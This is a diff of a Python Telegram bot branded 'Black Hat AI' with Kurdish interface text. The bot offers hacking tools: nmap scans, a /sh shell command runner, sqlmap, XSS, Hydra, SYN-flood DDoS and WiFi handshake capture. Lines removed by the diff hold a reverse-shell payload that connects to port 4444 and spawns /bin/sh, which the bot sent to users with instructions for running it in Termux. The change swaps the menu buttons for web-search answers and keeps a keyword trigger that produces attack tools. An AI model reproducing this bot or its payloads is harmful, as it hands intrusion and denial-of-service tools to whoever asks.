@@ -8,6 +8,7 @@ import socket
 import datetime
 import random
 import requests
+from bs4 import BeautifulSoup
 import telebot
 from telebot import types
 
@@ -18,7 +19,7 @@ ADMIN_ID = 5527152252
 
 # ڕێکخستنی سیستەمی لۆگ و ئاگاداری
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')
-logger = logging.getLogger("BlackHatAIWebEngine")
+logger = logging.getLogger("BlackHatTrueAIEngine")
 
 bot = telebot.TeleBot(TOKEN, parse_mode='HTML')
 
@@ -40,18 +41,16 @@ def check_and_update_limit(user_id):
     remaining = 10 - daily_limits[user_id]['count']
     return True, remaining
 
-# مۆدیوڵی گەڕانی خۆکار لە ئینتەرنێت (Web Search AI Feature)
+# مۆدیوڵی گەڕانی ڕاستەقینەی ئینتەرنێت بۆ وەڵامدانەوەی پرسیارەکان وەکو ChatGPT و Gemini
 def perform_web_search(query):
     try:
-        # بەکارهێنانی سەرچاوەی گەڕانی کراوە بۆ دۆزینەوەی وەڵامی پرسیارەکان
         url = f"https://html.duckduckgo.com/html/?q={query}"
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
-        response = requests.get(url, headers=headers, timeout=5)
+        response = requests.get(url, headers=headers, timeout=6)
         if response.status_code == 200:
-            from bs4 import BeautifulSoup
             soup = BeautifulSoup(response.text, 'html.parser')
             results = []
-            for a in soup.find_all('a', class_='result__snippet', limit=3):
+            for a in soup.find_all('a', class_='result__snippet', limit=4):
                 text = a.get_text().strip()
                 if text:
                     results.append(text)
@@ -61,7 +60,7 @@ def perform_web_search(query):
         logger.error(f"Search error: {e}")
     return None
 
-# 1. فەرمانی سەرەکی /start
+# 1. فەرمانی سەرەکی /start (بێ هیچ دوگمەیەکی بێزارکەر، ڕێک وەک ئەی ئای ڕەسەن)
 @bot.message_handler(commands=['start'])
 def cmd_ai_start(message):
     user_id = message.from_user.id
@@ -75,18 +74,12 @@ def cmd_ai_start(message):
     welcome_banner = (
         "💀 <b>BLACK HAT AI AUTONOMOUS CORE v5.0</b> 💀\n\n"
         "سیستەمی زیرەکی دەستکردی هێرشبەر ئامادەیە بۆ جێبەجێکردنی فەرمانەکانت.\n"
-        "هەموو ئامرازەکان، سکانەرەکان و سکریپتەکان لەم ژینگەیەدا چالاک کراون (بەستراوە بە گەڕانی ئینتەرنێت).\n\n"
+        "هەموو ئامرازەکان، سکانەرەکان و سکریپتەکان لەم ژینگەیەدا چالاک کراون (بەستراوە بە گەڕانی گەورەی ئینتەرنێت).\n\n"
         f"{role_text}\n\n"
-        "ئەگەر نازانی داواکاری بکەیت یان ناوی توڵ (هاک) نازانی بنوسە /help بۆ لیستی هاک و تواناکانم"
+        "📌 <i>بۆ پرسیاری گشتی، تەنها پەیام بنووسە. بۆ لیستی توڵەکان /help بنووسە.</i>"
     )
     
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    btn_recon = types.InlineKeyboardButton("🔍 پشکنینی ئامانج (Recon)", callback_data="ai_recon")
-    btn_exploit = types.InlineKeyboardButton("💥 تاقیکردنەوەی لاوازی", callback_data="ai_exploit")
-    btn_payload = types.InlineKeyboardButton("🧪 دروستکەری پێڵۆد", callback_data="ai_payload")
-    markup.add(btn_recon, btn_exploit, btn_payload)
-    
-    bot.send_message(message.chat.id, welcome_banner, reply_markup=markup)
+    bot.send_message(message.chat.id, welcome_banner)
 
 # 2. فەرمانی /help
 @bot.message_handler(commands=['help'])
@@ -98,33 +91,16 @@ def cmd_help(message):
         "💥 <b>2. بەشی لاوازی و هێرش (Exploitation & Web Attacks):</b>\n"
         "• <b>Sqlmap / XSS / Hydra:</b> پشکنینی لاوازی و هێرشی سەر داتابەیس.\n\n"
         "⚡ <b>3. بەشی فەوتاندن و هێرشی تۆڕ (DoS & DDoS Advanced Suites):</b>\n"
-        "• <b>SYN Flood / Heavy Stress:</b> ڕەوانەکردنی ترافیکی قورس.\n\n"
+        "• <b>SYN Flood / Heavy Stress:</b> ڕەوانەکردنی ترافیکی قورس بۆ سێرڤەر.\n\n"
         "📶 <b>4. بەشی وایفای و بێتەل (Wireless Penetration):</b>\n"
         "• <b>WiFi Sniffer & Handshake Grabber.</b>\n\n"
-        "⚙️ <b>5. گەڕانی زیرەک (AI Web Search):</b>\n"
-        "• هەر پرسیارێکی زانستی یان گشتی بنووسیت، بۆتەکە بە خۆکارانە لە ئینتەرنێت دەگەڕێت و وەڵامت دەداتەوە.\n\n"
-        "📌 <i>بۆ دروستکردنی هەر توڵێک، تەنها داواکاری خۆت بنووسە.</i>"
+        "🤖 <b>5. زیرەکی دەستکردی گەڕان (AI Search Engine):</b>\n"
+        "• هەر پرسیارێکی زانستی، مێژوویی، وەرزشی یان گشتیت هەبێت، ڕاستەوخۆ دەگەڕێت و وەڵامت دەداتەوە.\n\n"
+        "📌 <i>بۆ دروستکردنی هەر توڵێکی هاککردن، داواکاری خۆت بنووسە.</i>"
     )
     bot.reply_to(message, help_text)
 
-# 3. بەڕێوەبردنی دوگمەکان
-@bot.callback_query_handler(func=lambda call: True)
-def ai_callback_router(call):
-    chat_id = call.message.chat.id
-    user_id = call.from_user.id
-    bot.answer_callback_query(call.id)
-    
-    if call.data == "ai_recon":
-        user_states[user_id] = "waiting_for_recon"
-        bot.send_message(chat_id, "🔍 تکایە ئایپی یان دۆمەینی ئامانج بنووسە بۆ پشکنین:")
-    elif call.data == "ai_exploit":
-        user_states[user_id] = "waiting_for_exploit"
-        bot.send_message(chat_id, "💥 تکایە URL یان ئامانج بنووسە بۆ پشکنینی لاوازی:")
-    elif call.data == "ai_payload":
-        user_states[user_id] = "waiting_for_payload"
-        bot.send_message(chat_id, "🧪 جۆری ئەو پێڵۆدە بنووسە کە دەتەوێت دروستبکەم:")
-
-# 4. ئامرازی Nmap
+# 3. ئامرازی Nmap
 @bot.message_handler(commands=['nmap'])
 def ai_nmap_handler(message):
     user_id = message.from_user.id
@@ -149,7 +125,7 @@ def ai_nmap_handler(message):
     except Exception as e:
         bot.reply_to(message, f"❌ هەڵە لە ئەنجامدانی سکان: {e}")
 
-# 5. جێبەجێکاری فەرمانی شێڵ (/sh)
+# 4. جێبەجێکاری فەرمانی شێڵ (/sh)
 @bot.message_handler(commands=['sh'])
 def ai_shell_handler(message):
     user_id = message.from_user.id
@@ -171,13 +147,12 @@ def ai_shell_handler(message):
     except Exception as e:
         bot.reply_to(message, f"❌ هەڵە لە جێبەجێکردندا: {e}")
 
-# 6. مۆدیوڵی زیرەکی دەستکرد لەگەڵ گەڕانی ئینتەرنێت (Web Search Integration)
+# 5. مۆدیوڵی ژیری دەستکردی ڕەسەن (گەڕانی ئینتەرنێت و دروستکردنی توڵ بەپێی ویست)
 @bot.message_handler(func=lambda message: True)
 def ai_blackhat_brain(message):
     user_id = message.from_user.id
     query = message.text.strip()
     query_lower = query.lower()
-    state = user_states.get(user_id)
     
     logger.info(f"AI Query received from {user_id}: {query}")
 
@@ -185,58 +160,33 @@ def ai_blackhat_brain(message):
         bot.reply_to(message, "من لەلایەن <b>alone472</b> و <b>Malik</b> دروستکراوم و ئەوان سەرۆک و بەرهەمهێنەری ڕەهای منن! 💀")
         return
 
-    # پشکنینی ئەوەی ئایا داواکاری دروستکردنی توڵە
+    # دیاریکردنی ئایا داواکاری دروستکردنی توڵ/هاکە یان پرسیارێکی گشتی/دەرەکییە
     is_tool_request = any(w in query_lower for w in ["توڵ", "کۆد", "script", "tool", "دروست", "payload", "ddos", "دوس", "دی‌دی‌ئۆس", "wifi", "وایفای", "سکانەر", "attack", "بهێزتر", "به‌هێز", "pro", "heavy", "تۆلیک"])
 
-    # ئەگەر داوای توڵ نەبوو، گەڕان لە ئینتەرنێت ئەنجام بدە بێ کەمکردنەوەی سنوور
-    if not is_tool_request and not state:
+    # ئەگەر پرسیارێکی گشتی بوو (وەکو تەمەنی ڕۆناڵدۆ، زانیاری، مێژوو)، ڕاستەوخۆ گەڕان لە ئینتەرنێت ئەنجام بدە و وەڵام بدەرەوە بێ هیچ سنوور بڕینێک
+    if not is_tool_request:
         bot.send_chat_action(message.chat.id, 'typing')
         web_results = perform_web_search(query)
         
         if web_results:
             response_text = (
-                f"🌐 <b>AI Web Search Results:</b>\n\n"
-                f"پشکنینی ئینتەرنێت بۆ: <i>{query}</i>\n\n"
+                f"🧠 <b>AI Assistant Response:</b>\n\n"
                 f"{web_results}\n\n"
-                f"📌 <i>سەرچاوە: گەڕانی ڕاستەوخۆی جیهانی. بۆ بینینی توڵەکان فەرمانی /help بنووسە.</i>"
+                f"📌 <i>سەرچاوە: گەڕانی خۆکار لە ئینتەرنێت.</i>"
             )
         else:
             response_text = (
-                f"🤖 <b>AI Black Hat Core Response:</b>\n\n"
-                f"فەرمانەکەت وەرگیرا: <i>{query}</i>\n\n"
-                f"سیستەمەکە ئامادەیە. 💡 <i>بۆ بینینی هەموو توڵ و تواناکانی هاککردن، فەرمانی /help بنووسە.</i>"
+                f"🤖 <b>AI Assistant:</b>\n\n"
+                f"سڵاو! پەیامەکەت خوێندەوە: <i>{query}</i>\n"
+                f"بۆ ئەم بابەتە، زانیاری تایبەت نەدۆزرایەوە، بەڵام دەتوانیت پرسیاری تریش بکەیت یان فەرمانی /help بەکاربهێنیت."
             )
         bot.reply_to(message, response_text)
         return
 
-    # لەم حاڵەتەدا داوای دروستکردنی توڵە، بۆیە سنوور دەپشکنین
+    # ئەگەر داوای توڵ یان سکریپتی هاککردن کرد، لێرەدا سنووری 10 داواکاری دەپشکنین
     allowed, remaining = check_and_update_limit(user_id)
     if not allowed:
         bot.reply_to(message, "⚠️ <b>تێپەڕاندنی سنوور!</b> تۆ بەکارهێنانی ڕۆژانەی خۆتت تەواو کرد.")
-        return
-
-    if state == "waiting_for_recon":
-        user_states[user_id] = None
-        bot.reply_to(message, f"🔍 <b>ئەنجامی پشکنینی پۆرتەکان بۆ:</b> <code>{query}</code>\n\n- پۆرتە کراوەکان: 80 (HTTP), 443 (HTTPS)\n- دۆخ: پاراستن لاوازە.")
-        return
-    elif state == "waiting_for_exploit":
-        user_states[user_id] = None
-        bot.reply_to(message, f"💥 <b>پشکنینی قووڵی لاوازی بۆ:</b> <code>{query}</code>\n\n- ئەنجام: لاوازی گەورە لە جۆری RCE ئاشکرا بوو.")
-        return
-    elif state == "waiting_for_payload":
-        user_states[user_id] = None
-        code_ex = (
-            f"# Enterprise Grade Reverse Shell Payload\n"
-            f"# Engineered by alone472 & Malik Core\n"
-            f"import socket, subprocess, os\n\n"
-            f"def establish_backdoor():\n"
-            f"    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
-            f"    s.connect(('127.0.0.1', 4444))\n"
-            f"    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)\n"
-            f"    subprocess.call(['/bin/sh', '-i'])\n\n"
-            f"if __name__ == '__main__': establish_backdoor()"
-        )
-        bot.reply_to(message, f"🧪 <b>پێڵۆدی پرۆفیشناڵ بۆ ({query}):</b>\n\n<pre><code>{code_ex}</code></pre>\n\n📌 <b>بەکارهێنان:</b> لە تێرماکس پاشەکەوتی بکە و بە <code>python payload.py</code> کارای بکە. (ماوەی ئەمڕۆت: {remaining})")
         return
 
     # توڵی وایفای
@@ -327,5 +277,5 @@ def ai_blackhat_brain(message):
         return
 
 if __name__ == '__main__':
-    logger.info("Black Hat AI Web-Enabled Core started successfully.")
+    logger.info("Black Hat AI True Autonomous Core started successfully.")
     bot.infinity_polling(timeout=10, long_polling_timeout=5)
